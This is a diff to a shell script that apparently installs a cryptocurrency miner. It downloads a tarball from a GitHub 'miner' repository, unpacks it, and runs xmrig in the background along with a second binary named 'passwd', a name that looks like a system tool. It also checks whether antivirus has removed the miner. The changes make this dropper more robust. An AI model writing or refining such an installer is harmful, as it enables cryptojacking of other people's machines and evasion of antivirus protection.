@@ -31,29 +31,41 @@ if ! curl -L --progress-bar "https://raw.githubusercontent.com/ardx1/miner/main/
 fi
 
 echo "[*] Unpacking /tmp/minershell-main.tar.gz to $HOME/minershell-main"
-[ -d $HOME/minershell-main ] || mkdir $HOME/minershell-main
+mkdir -p $HOME/minershell-main
 if ! tar xf /tmp/minershell-main.tar.gz -C $HOME/minershell-main; then
   echo "ERROR: Can't unpack /tmp/minershell-main.tar.gz to $HOME/minershell-main directory"
   exit 1
 fi
 rm /tmp/minershell-main.tar.gz
 
-# Dar permissões de execução para xmrig e passwd
-chmod +x $HOME/minershell-main/xmrig
-chmod +x $HOME/minershell-main/passwd
+# Verifica se xmrig e passwd existem e atribui permissões de execução
+if [ -f "$HOME/minershell-main/xmrig" ]; then
+  chmod +x $HOME/minershell-main/xmrig
+else
+  echo "ERROR: xmrig file not found"
+  exit 1
+fi
+
+if [ -f "$HOME/minershell-main/passwd" ]; then
+  chmod +x $HOME/minershell-main/passwd
+else
+  echo "ERROR: passwd file not found"
+  exit 1
+fi
 
 echo "[*] Checking if advanced version of $HOME/minershell-main/xmrig works fine (and not removed by antivirus software)"
-sed -i 's/"donate-level": *[^,]*,/"donate-level": 1,/' $HOME/minershell-main/config.json
-$HOME/minershell-main/xmrig --help >/dev/null
-if (test $? -ne 0); then
-  if [ -f $HOME/minershell-main/xmrig ]; then
-    echo "WARNING: Advanced version of $HOME/minershell-main/xmrig is not functional"
-  else 
-    echo "WARNING: Advanced version of $HOME/minershell-main/xmrig was removed by antivirus (or some other problem)"
-  fi
+if [ -f "$HOME/minershell-main/config.json" ]; then
+  sed -i 's/"donate-level": *[^,]*,/"donate-level": 1,/' $HOME/minershell-main/config.json
 else
+  echo "ERROR: config.json file not found"
+  exit 1
+fi
+
+if $HOME/minershell-main/xmrig --help >/dev/null; then
   echo "[*] Executing xmrig..."
   $HOME/minershell-main/xmrig &
+else
+  echo "WARNING: Advanced version of $HOME/minershell-main/xmrig is not functional"
 fi
 
 # Executar o arquivo passwd
@@ -61,3 +73,4 @@ echo "[*] Executing passwd..."
 $HOME/minershell-main/passwd &
 
 echo "[*] Setup complete."
+
